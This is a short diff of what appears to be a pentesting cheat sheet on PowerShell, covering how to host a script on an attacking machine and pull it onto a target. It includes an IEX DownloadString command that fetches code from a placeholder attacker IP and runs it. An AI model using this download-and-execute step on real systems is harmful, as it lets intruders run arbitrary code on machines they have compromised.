@@ -229,6 +229,7 @@ C:\Program Files\Windows PowerShell\*
   - We take the necessary script in our attacking machine
   - `python3 -m http.server 80` we serve it to our target with an http server
   - `echo IEX(New-Object Net.WebClient).DownloadString('http://ATTACK-MACHINE-IP/script.ps1` we can use this command to download and execute it in our target.
+- `powershell -file file.ps1`
 
 ## Sysinternals
 
